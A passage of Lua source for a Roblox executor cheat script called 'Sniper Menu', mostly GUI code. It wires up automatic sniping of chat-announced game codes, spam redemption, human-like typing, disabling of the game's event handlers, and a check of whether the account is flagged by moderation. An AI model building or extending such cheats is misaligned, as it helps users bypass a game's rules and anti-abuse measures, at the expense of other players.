	local card = createCard(parent, 68, "TextButton")
	addHover(card, 10)

	local titleLabel = createLabel(card, title, 14, "text", Enum.Font.GothamMedium)
	titleLabel.Position = UDim2.fromOffset(14, 9)
	titleLabel.Size = UDim2.new(1, -78, 0, 20)

	local descriptionLabel = createLabel(card, description, 11, "muted")
	descriptionLabel.Position = UDim2.fromOffset(14, 31)
	descriptionLabel.Size = UDim2.new(1, -78, 0, 30)
	descriptionLabel.TextWrapped = true
	descriptionLabel.TextYAlignment = Enum.TextYAlignment.Top

	local switch = make("Frame", {
		AnchorPoint = Vector2.new(1, 0.5),
		BorderSizePixel = 0,
		Position = UDim2.new(1, -14, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
	}, card)
	circle(switch)

	local knob = make("Frame", {
		AnchorPoint = Vector2.new(0, 0.5),
		BackgroundColor3 = WHITE,
		BorderSizePixel = 0,
		Size = UDim2.fromOffset(16, 16),
	}, switch)
	circle(knob)

	local function paint(animated)
		local enabled = getter() == true
		paintObject(switch, {
			BackgroundColor3 = enabled and state.theme.accent or state.theme.muted,
			BackgroundTransparency = enabled and 0.1 or 0.6,
		}, animated)
		paintObject(knob, { Position = UDim2.new(0, enabled and 23 or 3, 0.5, 0) }, animated)
	end

	onRefresh(paint)

	card.MouseButton1Click:Connect(function()
		local ok, err = pcall(setter, not (getter() == true))
		if not ok then
			log("Could not change " .. title .. ": " .. tostring(err), "err")
		else
			log(string.format("%s: %s", title, getter() and "ON" or "OFF"))
		end
		paint(true)
	end)
end

local function addSlider(parent, title, minimum, maximum, step, getter, setter, format)
	local card = createCard(parent, 62)

	local titleLabel = createLabel(card, title, 14, "text", Enum.Font.GothamMedium)
	titleLabel.Position = UDim2.fromOffset(14, 8)
	titleLabel.Size = UDim2.new(1, -120, 0, 20)

	local valueLabel = createLabel(card, "", 13, "accent2", Enum.Font.GothamMedium, Enum.TextXAlignment.Right)
	valueLabel.AnchorPoint = Vector2.new(1, 0)
	valueLabel.Position = UDim2.new(1, -14, 0, 8)
	valueLabel.Size = UDim2.fromOffset(100, 20)

	local setBar = createSliderBar(card, UDim2.fromOffset(14, 34), UDim2.new(1, -28, 0, 20), function(alpha)
		local value = minimum + (maximum - minimum) * alpha
		value = math.floor(value / step + 0.5) * step
		value = tonumber(string.format("%.3f", math.clamp(value, minimum, maximum)))
		if value ~= getter() then
			setter(value)
		end
		valueLabel.Text = format(getter())
	end)

	onRefresh(function()
		setBar((getter() - minimum) / (maximum - minimum))
		valueLabel.Text = format(getter())
	end)
end

local function addSelector(parent, title, options, getter, setter, describe)
	local card = createCard(parent, 94)

	local titleLabel = createLabel(card, title, 14, "text", Enum.Font.GothamMedium)
	titleLabel.Position = UDim2.fromOffset(14, 8)
	titleLabel.Size = UDim2.new(1, -28, 0, 20)

	local noteLabel = createLabel(card, "", 11, "muted", Enum.Font.Gotham, Enum.TextXAlignment.Left)
	noteLabel.Position = UDim2.fromOffset(14, 29)
	noteLabel.Size = UDim2.new(1, -28, 0, 30)
	noteLabel.TextWrapped = true
	noteLabel.TextYAlignment = Enum.TextYAlignment.Top

	local holder = make("Frame", {
		BackgroundTransparency = 1,
		Position = UDim2.fromOffset(14, 62),
		Size = UDim2.new(1, -28, 0, 26),
	}, card)

	make("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal,
		Padding = UDim.new(0, 6),
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, holder)

	local entries = {}

	local function paint(animated)
		local current = getter()
		for option, entry in pairs(entries) do
			local selected = current == option
			paintObject(entry.button, {
				BackgroundColor3 = selected and state.theme.accent or state.theme.muted,
				BackgroundTransparency = selected and 0.7 or 0.9,
				TextColor3 = selected and state.theme.text or state.theme.muted,
			}, animated)
			paintObject(entry.outline, {
				Color = state.theme.accent,
				Transparency = selected and 0.15 or 0.85,
			}, animated)
		end
		if describe then
			noteLabel.Text = describe(current)
		end
	end

	local count = #options
	for index, option in ipairs(options) do
		local button = make("TextButton", {
			AutoButtonColor = false,
			BorderSizePixel = 0,
			Font = Enum.Font.GothamMedium,
			LayoutOrder = index,
			Size = UDim2.new(1 / count, -6 * (count - 1) / count, 1, 0),
			Text = option,
			TextSize = 13,
		}, holder)
		corner(button, 7)
		local outline = make("UIStroke", {
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
			Thickness = 1,
		}, button)
		entries[option] = { button = button, outline = outline }

		button.MouseButton1Click:Connect(function()
			local ok, err = pcall(setter, option)
			if not ok then
				log("Could not change " .. title .. ": " .. tostring(err), "err")
			else
				log(string.format("%s: %s", title, option))
			end
			paint(true)
		end)
	end

	onRefresh(paint)
end

local function addNumberInput(parent, title, description, getter, setter)
	local card = createCard(parent, 68)

	local titleLabel = createLabel(card, title, 14, "text", Enum.Font.GothamMedium)
	titleLabel.Position = UDim2.fromOffset(14, 9)
	titleLabel.Size = UDim2.new(1, -110, 0, 20)

	local descriptionLabel = createLabel(card, description, 11, "muted")
	descriptionLabel.Position = UDim2.fromOffset(14, 31)
	descriptionLabel.Size = UDim2.new(1, -110, 0, 30)
	descriptionLabel.TextWrapped = true
	descriptionLabel.TextYAlignment = Enum.TextYAlignment.Top

	local box = make("TextBox", {
		AnchorPoint = Vector2.new(1, 0.5),
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		BackgroundTransparency = 0.55,
		BorderSizePixel = 0,
		ClearTextOnFocus = false,
		Font = Enum.Font.GothamMedium,
		Position = UDim2.new(1, -14, 0.5, 0),
		Size = UDim2.fromOffset(76, 30),
		Text = "",
		TextSize = 14,
	}, card)
	corner(box, 7)
	bind(box, "TextColor3", "accent2")
	local outline = createStroke(box, 0.7)

	box.Focused:Connect(function()
		animate(outline, FAST, { Transparency = 0.2 })
	end)

	box.FocusLost:Connect(function()
		animate(outline, FAST, { Transparency = 0.7 })
		setter(tonumber(box.Text))
		box.Text = tostring(getter())
	end)

	onRefresh(function()
		if not box:IsFocused() then
			box.Text = tostring(getter())
		end
	end)
end

local function addKeybind(parent, title, description, getter, setter)
	local card = createCard(parent, 68)
	keybindCounter += 1
	local id = keybindCounter

	local titleLabel = createLabel(card, title, 14, "text", Enum.Font.GothamMedium)
	titleLabel.Position = UDim2.fromOffset(14, 9)
	titleLabel.Size = UDim2.new(1, -150, 0, 20)

	local descriptionLabel = createLabel(card, description, 11, "muted")
	descriptionLabel.Position = UDim2.fromOffset(14, 31)
	descriptionLabel.Size = UDim2.new(1, -150, 0, 30)
	descriptionLabel.TextWrapped = true
	descriptionLabel.TextYAlignment = Enum.TextYAlignment.Top

	local button = make("TextButton", {
		AnchorPoint = Vector2.new(1, 0.5),
		AutoButtonColor = false,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		BackgroundTransparency = 0.55,
		BorderSizePixel = 0,
		Font = Enum.Font.GothamMedium,
		Position = UDim2.new(1, -14, 0.5, 0),
		Size = UDim2.fromOffset(116, 30),
		Text = "",
		TextSize = 13,
	}, card)
	corner(button, 7)
	createStroke(button, 0.5)
	bind(button, "TextColor3", "accent2")
	addHover(button, 7)

	onRefresh(function()
		local waiting = waitingKeybind and waitingKeybind.id == id
		button.Text = waiting and "Press a key..." or tostring(getter())
	end)

	button.MouseButton1Click:Connect(function()
		waitingKeybind = { id = id, setter = setter, captured = false }
		runListeners(false)
	end)
end

local function addInfoCard(parent, title, body)
	local card = createCard(parent, 0)
	card.AutomaticSize = Enum.AutomaticSize.Y
	card.Size = UDim2.new(1, 0, 0, 0)

	make("UIPadding", {
		PaddingBottom = UDim.new(0, 12), PaddingLeft = UDim.new(0, 14),
		PaddingRight = UDim.new(0, 14), PaddingTop = UDim.new(0, 12),
	}, card)
	make("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, card)

	local titleLabel = createLabel(card, title, 14, "text", Enum.Font.GothamMedium)
	titleLabel.LayoutOrder = 1

	local bodyLabel = createLabel(card, body, 12, "muted")
	bodyLabel.AutomaticSize = Enum.AutomaticSize.Y
	bodyLabel.LayoutOrder = 2
	bodyLabel.Size = UDim2.new(1, 0, 0, 0)
	bodyLabel.TextWrapped = true
	bodyLabel.TextYAlignment = Enum.TextYAlignment.Top

	return card, bodyLabel
end

local function pageHeader(scroller, title, subtitle)
	local holder = make("Frame", {
		BackgroundTransparency = 1,
		LayoutOrder = nextOrder(scroller),
		Size = UDim2.new(1, 0, 0, 48),
	}, scroller)

	local titleLabel = createLabel(holder, title, 22, "text", Enum.Font.GothamBold)
	titleLabel.Size = UDim2.new(1, 0, 0, 26)

	local subtitleLabel = createLabel(holder, subtitle, 12, "muted")
	subtitleLabel.Position = UDim2.fromOffset(0, 28)
	subtitleLabel.Size = UDim2.new(1, 0, 0, 16)
end

local function createPage(name, parent)
	local page = make("CanvasGroup", {
		BackgroundTransparency = 1,
		GroupTransparency = 1,
		Name = name,
		Size = UDim2.fromScale(1, 1),
		Visible = false,
	}, parent)

	local scroller = make("ScrollingFrame", {
		Active = true,
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		CanvasSize = UDim2.new(),
		ElasticBehavior = Enum.ElasticBehavior.Never,
		ScrollBarImageTransparency = 0.25,
		ScrollBarThickness = 3,
		ScrollingDirection = Enum.ScrollingDirection.Y,
		Size = UDim2.fromScale(1, 1),
	}, page)
	bind(scroller, "ScrollBarImageColor3", "accent")

	make("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder }, scroller)
	make("UIPadding", {
		PaddingBottom = UDim.new(0, 14), PaddingLeft = UDim.new(0, 2),
		PaddingRight = UDim.new(0, 10), PaddingTop = UDim.new(0, 4),
	}, scroller)

	pages[name] = { page = page, scroller = scroller }
	return scroller
end

-- Petite console (Detected Words / Logs)
local function addConsole(parent, title, height, placeholder)
	local card = createCard(parent, height)

	local titleLabel = createLabel(card, title, 14, "text", Enum.Font.GothamMedium)
	titleLabel.Position = UDim2.fromOffset(14, 8)
	titleLabel.Size = UDim2.new(1, -110, 0, 20)

	local scroller = make("ScrollingFrame", {
		Active = true,
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		BackgroundTransparency = 0.6,
		BorderSizePixel = 0,
		CanvasSize = UDim2.new(),
		Position = UDim2.fromOffset(14, 38),
		ScrollBarImageTransparency = 0.25,
		ScrollBarThickness = 3,
		Size = UDim2.new(1, -28, 1, -50),
	}, card)
	bind(scroller, "ScrollBarImageColor3", "accent")
	corner(scroller, 7)

	make("UIListLayout", { Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder }, scroller)
	make("UIPadding", {
		PaddingBottom = UDim.new(0, 6), PaddingLeft = UDim.new(0, 8),
		PaddingRight = UDim.new(0, 8), PaddingTop = UDim.new(0, 6),
	}, scroller)

	local empty = createLabel(scroller, placeholder, 12, "muted")
	empty.LayoutOrder = 0
	empty.Size = UDim2.new(1, 0, 0, 18)

	local lines = {}
	local counter = 0

	local function clear()
		for _, line in ipairs(lines) do
			line:Destroy()
		end
		lines = {}
		empty.Visible = true
	end

	local function push(text, color)
		if destroyed then
			return
		end
		empty.Visible = false
		counter += 1
		local line = make("TextLabel", {
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			Font = Enum.Font.Gotham,
			LayoutOrder = counter,
			Size = UDim2.new(1, 0, 0, 0),
			Text = text,
			TextColor3 = color or LOG_COLORS.default,
			TextSize = 12,
			TextWrapped = true,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextYAlignment = Enum.TextYAlignment.Top,
		}, scroller)
		table.insert(lines, line)
		if #lines > 80 then
			table.remove(lines, 1):Destroy()
		end
		task.delay(0.05, function()
			if scroller.Parent then
				scroller.CanvasPosition = Vector2.new(0, math.max(0, scroller.AbsoluteCanvasSize.Y - scroller.AbsoluteSize.Y))
			end
		end)
	end

	local clearButton = createButton(card, "Clear", UDim2.fromOffset(70, 24), clear)
	clearButton.AnchorPoint = Vector2.new(1, 0)
	clearButton.Position = UDim2.new(1, -14, 0, 8)
	clearButton.TextSize = 12

	return push
end

-- Theme actions -----------------------------------------------
local function applyTemplate(name)
	if not THEMES[name] then
		return
	end
	config.themeName = name
	loadTheme()
	refreshTheme(not state.rainbow)
	saveConfig()
	log("Theme applied: " .. THEMES[name].label)
end

local function resetMenuSettings()
	config.themeName = DEFAULT_CONFIG.themeName
	config.transparency = DEFAULT_CONFIG.transparency
	config.scale = DEFAULT_CONFIG.scale
	config.animations = DEFAULT_CONFIG.animations
	config.menuKey = DEFAULT_CONFIG.menuKey
	loadTheme()
	refreshTheme(true)
	refreshTransparency()
	updateScale(true)
	saveConfig()
	log("Menu settings reset")
end

-- Window behavior ---------------------------------------------
local function computeScale()
	local camera = workspace.CurrentCamera
	local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
	local fit = math.min(viewport.X / (MENU_SIZE.X + 40), viewport.Y / (MENU_SIZE.Y + 40))
	return math.clamp(fit, 0.5, 1) * config.scale
end

updateScale = function(animated)
	if not scale then
		return
	end
	local target = computeScale() * (state.visible and 1 or 0.94)
	if animated then
		animate(scale, SMOOTH, { Scale = target })
	else
		scale.Scale = target
	end
end

local function clampWindow(target)
	local camera = workspace.CurrentCamera
	local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
	local limitX = math.max(viewport.X / 2 - 60, 0)
	local limitY = math.max(viewport.Y / 2 - 30, 0)
	return Vector2.new(math.clamp(target.X, -limitX, limitX), math.clamp(target.Y, -limitY, limitY))
end

function SniperMenu.setVisible(visible)
	if destroyed then
		return
	end
	state.visible = visible

	if refs.reopen then
		refs.reopen.Visible = not visible and UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
	end

	if visible then
		screenGui.Enabled = true
		animate(main, SMOOTH, { GroupTransparency = 0 })
		updateScale(true)
		return
	end

	animate(main, FAST, { GroupTransparency = 1 })
	updateScale(true)
	task.delay(0.2, function()
		if not state.visible and not destroyed then
			screenGui.Enabled = false
		end
	end)
end

local function setMinimized(minimized)
	state.minimized = minimized
	refs.minimize.Text = minimized and "+" or "—"
	animate(main, SMOOTH, { Size = UDim2.fromOffset(MENU_SIZE.X, minimized and TITLE_HEIGHT or MENU_SIZE.Y) })
end

function SniperMenu.destroy()
	if destroyed then
		return
	end
	destroyed = true
	writeConfig()

	runtime.scanning = false
	if runtime.notifConn then
		pcall(function() runtime.notifConn:Disconnect() end)
		runtime.notifConn = nil
	end
	pcall(setBlockEvents, false)
	pcall(setOptimize, false)

	for _, connection in ipairs(globalConnections) do
		pcall(function() connection:Disconnect() end)
	end
	table.clear(globalConnections)

	if screenGui then
		screenGui:Destroy()
	end

	local env = getgenv and getgenv() or _G
	if env.StopSniperMenu == SniperMenu.destroy then
		env.StopSniperMenu = nil
	end
end

-- Flag Check (page Important) ---------------------------------
local FLAG = {
	code = "SAMMY",
	limit = 2.5,
	minWait = 0.35,
	timeout = 12,
	poll = 0.03,
	noteEnglish = "You're NOT flagged if you have all 3:\n- 5+ Rebirths\n- Account 1 month+ old\n- No warnings / not public banned\n\nMissing One = Flagged",
	noteFrench = "Tu n'es PAS flag si tu as les 3 :\n- 5+ Rebirths\n- Compte de plus d'1 mois\n- Aucun avertissement / pas banni publiquement\n\nIl en manque un = Flagged",
}
local flagCheck = { running = false, text = "Result: -", color = nil, detail = "Reply time: -" }

local function isOwnGui(object)
	return screenGui ~= nil and object:IsDescendantOf(screenGui)
end
runtime.isOwn = isOwnGui

local function flagSnapshot()
	local snap = {}
	for _, descendant in ipairs(PlayerGui:GetDescendants()) do
		if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
			if type(descendant.Text) == "string" and descendant.Text ~= "" then
				snap[descendant] = descendant.Text
			end
		end
	end
	return snap
end

local function flagIsReply(text)
	local lowered = string.lower(text)
	return lowered:find("sold out", 1, true) ~= nil or lowered:find("soldout", 1, true) ~= nil
		or lowered:find("expired", 1, true) ~= nil
end

local function flagFindNew(before)
	for _, descendant in ipairs(PlayerGui:GetDescendants()) do
		if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
			local text = descendant.Text
			if type(text) == "string" and flagIsReply(text) and not isOwnGui(descendant) then
				local previous = before[descendant]
				if previous == nil or previous ~= text then
					return text
				end
			end
		end
	end
	return nil
end

local function setFlagResult(text, color, detail)
	flagCheck.text = text
	flagCheck.color = color
	flagCheck.detail = detail
	if refs.flagResult then
		refs.flagResult.Text = text
		refs.flagResult.TextColor3 = color or state.theme.muted
		refs.flagDetail.Text = detail
	end
end

local function runFlagCheck()
	if flagCheck.running or destroyed then
		return
	end
	flagCheck.running = true
	if refs.flagButton then
		refs.flagButton.Text = "Checking..."
	end
	setFlagResult("Result: checking...", AMBER, "Waiting for the game reply")
	log("Flag Check started", "busy")

	task.spawn(function()
		local before = flagSnapshot()
		local startedAt = os.clock()

		task.spawn(function()
			pcall(redeemClassic, FLAG.code, true)
		end)

		local feedback = nil
		local elapsed = 0
		local deadline = startedAt + FLAG.timeout

		while os.clock() < deadline and not destroyed do
			elapsed = os.clock() - startedAt
			if elapsed >= FLAG.minWait then
				feedback = flagFindNew(before)
				if feedback then
					elapsed = os.clock() - startedAt
					break
				end
			end
			if refs.flagDetail then
				refs.flagDetail.Text = string.format("Waiting for the game reply... %.1fs", elapsed)
			end
			task.wait(FLAG.poll)
		end

		flagCheck.running = false
		if refs.flagButton then
			refs.flagButton.Text = "Flag Check"
		end
		if destroyed then
			return
		end

		if not feedback then
			setFlagResult("Result: no reply", AMBER, string.format("No reply in %.0fs", FLAG.timeout))
			log("Flag Check: no reply", "err")
			return
		end

		local detail = string.format("Reply in %.2fs  -  %s", elapsed, feedback)
		if elapsed < FLAG.limit then
			setFlagResult("Result: Not Flagged", GREEN, detail)
			log(string.format("Flag Check: Not Flagged (%.2fs)", elapsed), "ok")
		else
			setFlagResult("Result: Flagged", RED, detail)
			log(string.format("Flag Check: Flagged (%.2fs)", elapsed), "err")
		end
	end)
end

-- Pages -------------------------------------------------------
local function buildMainPage(scroller)
	pageHeader(scroller, "Main", "Code sniper controls")

	-- Bouton Start Scan / Scanning. .. ...
	local scanCard = createCard(scroller, 60, "TextButton")
	addHover(scanCard, 10)

	refs.scanLabel = createLabel(scanCard, "Start Scan", 18, "text", Enum.Font.GothamBold, Enum.TextXAlignment.Center)
	refs.scanLabel.Size = UDim2.fromScale(1, 1)

	local scanToken = 0
	local scanStroke = scanCard:FindFirstChildOfClass("UIStroke")

	ui.setScanning = function(on)
		scanToken += 1
		local token = scanToken
		if scanStroke then
			animate(scanStroke, FAST, { Transparency = on and 0.1 or 0.8 })
		end
		if not on then
			refs.scanLabel.Text = "Start Scan"
			return
		end
		task.spawn(function()
			local frames = { "Scanning.", "Scanning..", "Scanning..." }
			local index = 1
			while scanToken == token and not destroyed do
				refs.scanLabel.Text = frames[index]
				index = index % #frames + 1
				task.wait(0.4)
			end
		end)
	end

	scanCard.MouseButton1Click:Connect(function()
		if runtime.scanning then
			stopScan()
		else
			startScan()
		end
	end)

	addToggle(scroller, "Spam Redeem", "Submit the code several times", function()
		return config.spamRedeem
	end, function(value)
		setConfig("spamRedeem", value)
	end)

	addNumberInput(scroller, "Spam Count", "Number of submits (1-100)", function()
		return config.spamCount
	end, function(value)
		if value then
			setConfig("spamCount", math.clamp(math.floor(value), 1, 100))
		end
	end)

	-- Submit After : - N +
	do
		local card = createCard(scroller, 68)
		local titleLabel = createLabel(card, "Submit After:", 14, "text", Enum.Font.GothamMedium)
		titleLabel.Position = UDim2.fromOffset(14, 9)
		titleLabel.Size = UDim2.new(1, -150, 0, 20)
		local descriptionLabel = createLabel(card, "Messages detected before redeeming", 11, "muted")
		descriptionLabel.Position = UDim2.fromOffset(14, 31)
		descriptionLabel.Size = UDim2.new(1, -150, 0, 30)
		descriptionLabel.TextWrapped = true
		descriptionLabel.TextYAlignment = Enum.TextYAlignment.Top

		local valueLabel = createLabel(card, "", 16, "accent2", Enum.Font.GothamBold, Enum.TextXAlignment.Center)
		valueLabel.AnchorPoint = Vector2.new(1, 0.5)
		valueLabel.Position = UDim2.new(1, -50, 0.5, 0)
		valueLabel.Size = UDim2.fromOffset(40, 30)

		local function step(delta)
			setConfig("submitAfter", math.clamp(config.submitAfter + delta, 1, 50))
			valueLabel.Text = tostring(config.submitAfter)
		end

		local minus = createButton(card, "-", UDim2.fromOffset(32, 30), function() step(-1) end)
		minus.AnchorPoint = Vector2.new(1, 0.5)
		minus.Position = UDim2.new(1, -94, 0.5, 0)
		local plus = createButton(card, "+", UDim2.fromOffset(32, 30), function() step(1) end)
		plus.AnchorPoint = Vector2.new(1, 0.5)
		plus.Position = UDim2.new(1, -14, 0.5, 0)

		onRefresh(function()
			valueLabel.Text = tostring(config.submitAfter)
		end)
	end

	ui.word = addConsole(scroller, "Detected Words", 200, "Detected Words appears here..")
end

local function buildThemePage(scroller)
	pageHeader(scroller, "Thème", "Customize the look of the menu")

	for _, name in ipairs(THEME_ORDER) do
		local template = THEMES[name]
		local card, cardStroke = createCard(scroller, 76, "TextButton")
		addHover(card, 10)

		local swatch = make("Frame", {
			BackgroundColor3 = WHITE,
			BorderSizePixel = 0,
			Position = UDim2.fromOffset(14, 14),
			Size = UDim2.fromOffset(48, 48),
		}, card)
		circle(swatch)
		make("UIGradient", {
			Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, template.swatch[1]),
				ColorSequenceKeypoint.new(0.5, template.swatch[2]),
				ColorSequenceKeypoint.new(1, template.swatch[3]),
			}),
			Rotation = 45,
		}, swatch)

		local nameLabel = createLabel(card, template.label, 15, "text", Enum.Font.GothamBold)
		nameLabel.Position = UDim2.fromOffset(74, 16)
		nameLabel.Size = UDim2.new(1, -160, 0, 22)

		local descriptionLabel = createLabel(card, template.description, 12, "muted")
		descriptionLabel.Position = UDim2.fromOffset(74, 40)
		descriptionLabel.Size = UDim2.new(1, -160, 0, 18)

		local pill = make("TextLabel", {
			AnchorPoint = Vector2.new(1, 0.5),
			BorderSizePixel = 0,
			Font = Enum.Font.GothamMedium,
			Position = UDim2.new(1, -14, 0.5, 0),
			Size = UDim2.fromOffset(64, 26),
			TextSize = 12,
		}, card)
		circle(pill)

		onRefresh(function(animated)
			local active = config.themeName == name
			pill.Text = active and "Active" or "Apply"
			paintObject(pill, {
				BackgroundColor3 = active and state.theme.accent or state.theme.muted,
				BackgroundTransparency = active and 0.7 or 0.88,
				TextColor3 = active and state.theme.accent2 or state.theme.muted,
			}, animated)
			paintObject(cardStroke, { Transparency = active and 0.2 or 0.8 }, animated)
		end)

		card.MouseButton1Click:Connect(function()
			applyTemplate(name)
		end)
	end

	addSlider(scroller, "Background Transparency", 0, 1, 0.01, function()
		return config.transparency
	end, function(value)
		setConfig("transparency", value)
	end, function(value)
		return string.format("%.0f", value * 100)
	end)
end

local function buildLogsPage(scroller)
	pageHeader(scroller, "Logs", "Sniper activity")
	ui.logPush = addConsole(scroller, "Activity", 430, "No activity yet..")

	ui.log = function(message, kind)
		if destroyed or not ui.logPush then
			return
		end
		ui.logPush(string.format("[%s] %s", os.date("%H:%M:%S"), tostring(message)), LOG_COLORS[kind])
	end
end

local function buildImportantPage(scroller)
	pageHeader(scroller, "Important", "Account checks")

	local card = createCard(scroller, 0)
	card.AutomaticSize = Enum.AutomaticSize.Y
	card.Size = UDim2.new(1, 0, 0, 0)

	make("UIPadding", {
		PaddingBottom = UDim.new(0, 14), PaddingLeft = UDim.new(0, 14),
		PaddingRight = UDim.new(0, 14), PaddingTop = UDim.new(0, 12),
	}, card)
	make("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, card)

	local titleLabel = createLabel(card, "Flag Check", 14, "text", Enum.Font.GothamMedium)
	titleLabel.LayoutOrder = 1

	local englishLabel = createLabel(card, FLAG.noteEnglish, 12, "text")
	englishLabel.AutomaticSize = Enum.AutomaticSize.Y
	englishLabel.LayoutOrder = 2
	englishLabel.Size = UDim2.new(1, 0, 0, 0)
	englishLabel.TextWrapped = true
	englishLabel.TextYAlignment = Enum.TextYAlignment.Top

	local divider = make("Frame", {
		BackgroundTransparency = 0.8, BorderSizePixel = 0,
		LayoutOrder = 3, Size = UDim2.new(1, 0, 0, 1),
	}, card)
	bind(divider, "BackgroundColor3", "accent")

	local frenchLabel = createLabel(card, FLAG.noteFrench, 12, "muted")
	frenchLabel.AutomaticSize = Enum.AutomaticSize.Y
	frenchLabel.LayoutOrder = 4
	frenchLabel.Size = UDim2.new(1, 0, 0, 0)
	frenchLabel.TextWrapped = true
	frenchLabel.TextYAlignment = Enum.TextYAlignment.Top

	refs.flagButton = createButton(card, "Flag Check", UDim2.new(1, 0, 0, 40), runFlagCheck)
	refs.flagButton.LayoutOrder = 5

	refs.flagResult = createLabel(card, "", 18, nil, Enum.Font.GothamBold)
	refs.flagResult.LayoutOrder = 6
	refs.flagResult.Size = UDim2.new(1, 0, 0, 26)

	refs.flagDetail = createLabel(card, "", 12, "muted")
	refs.flagDetail.AutomaticSize = Enum.AutomaticSize.Y
	refs.flagDetail.LayoutOrder = 7
	refs.flagDetail.Size = UDim2.new(1, 0, 0, 0)
	refs.flagDetail.TextWrapped = true
	refs.flagDetail.TextYAlignment = Enum.TextYAlignment.Top

	onRefresh(function()
		refs.flagResult.Text = flagCheck.text
		refs.flagResult.TextColor3 = flagCheck.color or state.theme.muted
		if not flagCheck.running then
			refs.flagDetail.Text = flagCheck.detail
		end
	end)
end

local function buildSettingsPage(scroller)
	pageHeader(scroller, "Settings", "Sniper and menu preferences")

	addSection(scroller, "SNIPER")

	addToggle(scroller, "2 Word Check", "Redeem at the 2nd message, retry if invalid", function()
		return config.twoWordCheck
	end, function(value)
		setConfig("twoWordCheck", value)
	end)

	addToggle(scroller, "Wait For Msg If Invalid", "Keep the code and add the next message", function()
		return config.waitInvalid
	end, function(value)
		setConfig("waitInvalid", value)
	end)

	addToggle(scroller, "Auto Start Scan on Annc", "Starts the scan on CODE IS / USE CODE / REDEEM CODE", function()
		return config.autoStartScan
	end, function(value)
		setConfig("autoStartScan", value)
		if value then
			startListener()
		end
	end)

	addToggle(scroller, "Hold Code if says Wait", "Pause on WAIT / GUYS, resume on USE CODE / CODE IS", function()
		return config.holdOnWait
	end, function(value)
		setConfig("holdOnWait", value)
		runtime.held = false
	end)

	addToggle(scroller, "Send Snipes to Discord", "Needs WEBHOOK_URL at the top of the script", function()
		return config.sendWebhook
	end, function(value)
		setConfig("sendWebhook", value)
	end)

	addToggle(scroller, "Type Instead of Instant Put", "Type the code letter by letter", function()
		return config.typeInstead
	end, function(value)
		setConfig("typeInstead", value)
		if not value then
			task.spawn(resetTyping)
		end
	end)

	addSelector(scroller, "Typing Speed", TYPING_OPTIONS, function()
		return config.typingMode
	end, function(option)
		setConfig("typingMode", option)
	end, function(current)
		if current == "MAX" then
			return "no delay"
		end
		return string.format("%ss per letter", tostring(TYPING_SPEEDS[current]))
	end)

	addToggle(scroller, "Optimize Ping & FPS", "Lower graphics, disable effects", function()
		return config.optimize
	end, function(value)
		setOptimize(value)
		setConfig("optimize", value)
	end)

	addToggle(scroller, "Block All Events", "Disable the game's event handlers", function()
		return config.blockEvents
	end, function(value)
		local ok, reason = setBlockEvents(value)
		if not ok then
			error(reason, 0)
		end
		setConfig("blockEvents", value)
	end)

	addSection(scroller, "MENU")

	addKeybind(scroller, "Menu key", "Show or hide this menu", function()
		return config.menuKey
	end, function(name)
		setConfig("menuKey", name)
	end)

	addSlider(scroller, "Menu scale", 0.7, 1.3, 0.05, function()
		return config.scale
	end, function(value)
		setConfig("scale", value)
	end, function(value)
		return string.format("%.0f%%", value * 100)
	end)

	addToggle(scroller, "Animations", "Smooth fades and transitions", function()
		return config.animations
	end, function(value)
		setConfig("animations", value)
	end)

	addButton(scroller, "Reset menu settings", resetMenuSettings)

	addButton(scroller, "Unload script", function()
		SniperMenu.setVisible(false)
		task.delay(config.animations and 0.25 or 0, SniperMenu.destroy)
	end)
end

local function buildSessionText()
	return string.format("Executor: %s\nPlace ID: %s\nFPS: %d", executorName, tostring(game.PlaceId), state.fps)
end

local function buildInfoPage(scroller)
	pageHeader(scroller, "Info", "About this build")

	addInfoCard(scroller, "Sniper Menu", "Version " .. VERSION .. " - menu and animations from Arixz, scan/redeem logic from the Weekly Code Sniper.")

	local _, controlsLabel = addInfoCard(scroller, "Controls", "")
	onRefresh(function()
		controlsLabel.Text = string.format("Toggle menu: %s\nDrag the title bar to move the window", tostring(config.menuKey))
	end)

	local _, sessionLabel = addInfoCard(scroller, "Session", "")
	sessionLabel.Text = buildSessionText()
	refs.session = sessionLabel
end

-- Initialisation ----------------------------------------------
local function initialize()
	loadTheme()

	local parentGui = (gethui and gethui()) or PlayerGui
	local old = parentGui:FindFirstChild(MENU_NAME)
	if old then
		old:Destroy()
	end

	screenGui = make("ScreenGui", {
		DisplayOrder = 260,
		IgnoreGuiInset = true,
		Name = MENU_NAME,
		ResetOnSpawn = false,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	}, parentGui)

	main = make("CanvasGroup", {
		AnchorPoint = Vector2.new(0.5, 0.5),
		BorderSizePixel = 0,
		GroupTransparency = 1,
		Name = "Window",
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromOffset(MENU_SIZE.X, MENU_SIZE.Y),
	}, screenGui)

	bind(main, "BackgroundColor3", "background")
	bindTransparency(main, 0)
	corner(main, 18)
	createStroke(main, 0.28, 1.7)

	scale = make("UIScale", { Scale = computeScale() * 0.92 }, main)

	-- Barre de titre
	local titleBar = make("Frame", {
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 0, TITLE_HEIGHT),
	}, main)

